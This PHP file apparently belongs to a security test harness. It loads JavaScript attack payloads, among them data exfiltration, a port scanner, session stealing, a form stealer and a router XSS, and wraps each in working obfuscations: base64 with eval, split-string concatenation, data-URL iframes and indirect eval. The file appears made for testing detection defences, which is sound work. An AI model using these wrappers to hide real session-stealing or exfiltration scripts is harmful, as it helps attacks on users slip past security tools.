<?php

$OBFUSCATIONS = array(
  'basic' => NULL,
  'base64' => 'b64',
  'base64_eval1' => 'b64_eval1',
  'base64_eval2' => 'b64_eval2',
  'eval1' => 'eval1',
  'eval2' => 'eval2',
  'eval3' => 'eval3',
  'concat' => 'concat',
  'data' => 'data',
  'data_base64' => 'data_b64',
  'data_html' => 'data_html',
  'data_iframe' => 'data_iframe',
  'data_anchor' => 'data_anchor',
  'dispatch' => 'dispatch',
  'dynamic' => 'dynamic',
);

// Before calling this function, the containing page should define the
// |PreparePayload| and |PrepareImage| functions to encode the payloads.
function LoadAttacks() {
  global $OBFUSCATIONS;
  $attacks = array();

  $adesc = 'exfil_test';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $exfilsub = array('TESTNAME' => $name);
    $attacks[$adesc][$name] = PrepareScript('exfil', $obfu, $exfilsub);
  }

  $adesc = 'exfil_clone1';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $testsuf = 'clone1_'.$name;
    $exfilsub['TESTNAME'] = $testsuf;
    $attacks[$adesc][$name] = PrepareScript('exfil_clone1', $obfu, $exfilsub);
  }

  $adesc = 'exfil_clone2';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $testsuf = 'clone2_'.$name;
    $exfilsub['TESTNAME'] = $testsuf;
    $attacks[$adesc][$name] = PrepareScript('exfil_clone2', $obfu, $exfilsub);
  }

  $adesc = 'exfil_clone3';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $testsuf = 'clone3_'.$name;
    $exfilsub['TESTNAME'] = $testsuf;
    $attacks[$adesc][$name] = PrepareScript('exfil_clone3', $obfu, $exfilsub);
  }

  $adesc = 'exfil_clone4';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $testsuf = 'clone4_'.$name;
    $exfilsub['TESTNAME'] = $testsuf;
    $attacks[$adesc][$name] = PrepareScript('exfil_clone4', $obfu, $exfilsub);
  }

  $adesc = 'exfil_clone5';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $testsuf = 'clone5_'.$name;
    $exfilsub['TESTNAME'] = $testsuf;
    $attacks[$adesc][$name] = PrepareScript('exfil_clone5', $obfu, $exfilsub);
  }

  $adesc = 'portscanner';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $attacks[$adesc][$name] = PrepareScript('portscanner', $obfu);
  }

  $adesc = 'redleg-array-obfuscate';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $attacks[$adesc][$name] = PrepareScript('redleg-array-obfuscate', $obfu);
  }

  $adesc = 'session-steal';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $attacks[$adesc][$name] = PrepareScript('sessionsteal', $obfu, true);
  }

  $adesc = 'metasploit-steal-form';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $attacks[$adesc][$name] = PrepareScript('metasploit-steal-form', $obfu, true);
  }

  $adesc = 'samy-mapxss';
  $attacks[$adesc] = array();
  foreach ($OBFUSCATIONS as $name => $obfu) {
    $attacks[$adesc]['#comment'] = 'This attack targets the Verizon FiOS'.
      ' router. Even without this setup, the initial XMLHttpRequest can'.
      ' be observed.';
    $attacks[$adesc][$name] = PrepareScript('samy-mapxss', $obfu, true);
  }

  $adesc = 'image-exfil';
  $attacks[$adesc] = array();
  $attacks[$adesc]['basic'] = PrepareImage(MALROOT.'images/attack.png');

  return $attacks;
}

function GetBaseSubs() {
  static $basesubs = array(
    'MALHOST' => MALHOST,
    'TGTHOST' => TGTHOST,
    'MALROOT' => MALROOT,
    'TGTROOT' => TGTROOT,
    'MALALTROOT' => MALALTROOT,
  );
  // Return by value.
  return $basesubs;
}

function GetRawPayload($name) {
  static $map = array();
  if (isset($map[$name])) {
    return $map[$name];
  }
  $filename = $name.'.js';
  $filepath = '../payload/'.$filename;
  if (file_exists($filepath)) {
    $code = file_get_contents($filepath);
  } else {
    $code = '';
  }
  return $code;
}

function GetPayload($name, $subs=NULL) {
  $code = GetRawPayload($name);
  if (is_array($subs)) {
    foreach ($subs as $find => $repl) {
      // Enforce that search strings start with '#'.
      $code = str_replace('#'.$find, $repl, $code);
    }
  }
  return $code;
}

function ObfuscatePayload($payload, $obfu) {
  if (is_string($obfu)) {
    switch ($obfu) {
      case 'b64':
        $payload = 'eval(window.atob("'.base64_encode($payload).'"));';
        break;
      case 'b64_eval1':
        $payload = 'var x=eval;x(window.atob("'.base64_encode($payload).'"));';
        break;
      case 'b64_eval2':
        $payload = '(1,eval)(window.atob("'.base64_encode($payload).'"));';
        break;
      case 'eval1':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'var exp="'.$payload.'";(1,eval)(exp);';
        break;
      case 'eval2':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'var exp="'.$payload.'";eval("ev"+"al")(exp);';
        break;
      case 'eval3':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'var exp="'.$payload.'";eval(490837..toString(8<<2)+"")(exp);';
        break;
      case 'concat':
        $split = '';
        $concat = '';
        $pllen = strlen($payload);
        for ($start=0; $start<$pllen; $start=$end) {
          $sublen = rand(1, 10);
          $end = $start + $sublen;
          $sub = substr($payload, $start, $sublen);
          $sub = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $sub);
          $split .= 'var v'.$start.'="'.$sub.'";';
          if (strlen($concat) > 0) $concat .= '+';
          $concat .= 'v'.$start;
        }
        $payload = $split.'eval('.$concat.')';
        break;
      case 'data':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'var data = "'.$payload.'";';
        $payload .= 'var URL = "data:text/javascript;," + encodeURIComponent(data);';
        $payload .= 'var script = document.createElement("script");';
        $payload .= 'script.src = URL;';
        $payload .= 'document.getElementsByTagName("head")[0].appendChild(script);';
        break;
      case 'data_b64':
        $payload = 'var data = "'.base64_encode($payload).'";';
        $payload .= 'var URL = "data:text/javascript;base64," + data;';
        $payload .= 'var script = document.createElement("script");';
        $payload .= 'script.src = URL;';
        $payload .= 'document.getElementsByTagName("head")[0].appendChild(script);';
        break;
      case 'data_html':
        $payload = '<script>'.$payload.'</script>';
        $payload = 'var data = "'.base64_encode($payload).'";';
        $payload .= 'var URL = "data:text/html;charset=utf-8;base64," + data;';
        $payload .= 'var obj = document.createElement("object");';
        $payload .= 'obj.data = URL;';
        $payload .= 'document.getElementsByTagName("body")[0].appendChild(obj);';
        break;
      case 'data_iframe':
        $payload = '<script>'.$payload.'</script>';
        $payload = 'var data = "'.base64_encode($payload).'";';
        $payload .= 'var URL = "data:text/html;charset=utf-8;base64," + data;';
        $payload .= 'var iframe = document.createElement("iframe");';
        $payload .= 'iframe.src = URL;';
        $payload .= 'iframe.style.width="1px";';
        $payload .= 'iframe.style.height="1px";';
        $payload .= 'document.getElementsByTagName("body")[0].appendChild(iframe);';
        break;
      case 'data_anchor':
        $payload = '<script>'.$payload.'</script>';
        $payload = 'var data = "'.base64_encode($payload).'";';
        $payload .= 'var URL = "data:text/html;charset=utf-8;base64," + data;';
        $payload .= 'var a = document.createElement("a");';
        $payload .= 'a.href = URL;';
        $payload .= 'a.target = "_blank";';
        $payload .= 'a.innerHTML = "Suspicious Link";';
        $payload .= 'document.getElementsByTagName("body")[0].appendChild(a);';
        $payload .= 'a.click();';
break;
      case 'dispatch':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'var exp = "'.$payload.'";';
        $payload .= 'var button = document.createElement("input");';
        $payload .= 'button.type = "button";';
        $payload .= 'var event = new Event("dblclick");';
        $payload .= 'button.addEventListener("dblclick", Function(exp), false);';
        $payload .= 'button.dispatchEvent(event);';
        break;
      case 'daft':
        $errors[] = 'DaftLogic obfuscation not supported';
        break;
      case 'dynamic':
        $payload = str_replace(array('"', "\n",  "\r"), array('\\"', '\\n', '\\r'), $payload);
        $payload = 'exp = "'.$payload.'";';
        $payload .= 'eval("var sneaky = Function(exp)");';
        $payload .= 'sneaky();';
        break;
      default:
        $errors[] = 'Unsupported encoding type: '.$obfu;
        break;
    }
  }
  return $payload;        
}

function GetObfuscatedPayload($testname, $obfu=NULL, $subs=NULL) {
  $payload = GetPayload($testname, $subs); 
  return ObfuscatePayload($payload, $obfu);
}

?>
